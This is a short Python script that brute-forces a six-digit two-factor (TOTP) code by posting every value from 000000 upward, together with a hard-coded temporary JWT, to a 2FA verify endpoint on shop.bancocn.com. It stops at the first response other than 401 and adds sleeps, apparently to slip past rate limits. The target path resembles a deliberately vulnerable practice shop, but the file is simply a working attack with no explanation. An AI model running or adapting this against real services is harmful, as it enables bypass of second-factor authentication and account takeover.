import requests
from time import sleep
from random import random

for n in range(0, 1000000):
    if n // 90 == 0:
        print("Taking a little nap...")
        sleep(180)

    code = str(n)
    len_code = len(code)
    for i in range(6 - len_code):
        code = "0" + code
    
    TOKEN = {"tmpToken":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VySWQiOjEsInR5cGUiOiJwYXNzd29yZF92YWxpZF9uZWVkc19zZWNvbmRfZmFjdG9yX3Rva2VuIiwiaWF0IjoxNjYzNjA4NjM2LCJleHAiOjE2NjM2MjY2MzZ9.bzhsY-t_ufPGtKBbO56InPEzprt3LlN_Dbg5QhnGA2UYmI_AB8JncMeTwNsQQbT49xo_WVtCSOrV8V6Um-GrOGwBfJHiWx_JAZYTFn0dQ4WEWCNMfGN1WMfE9caa1u4DMnXoZBA30PSDuDpknmusOPlWPtlmMpocfkBEVXjcqR0","totpToken":code}

    response = requests.post("http://shop.bancocn.com/rest/2fa/verify", json=TOKEN)
    print(code)
    if response.status_code != 401:
        print(f"{response.status_code} | {TOKEN['totpToken']}")
        break;

    nap_time = random()
    sleep(nap_time)
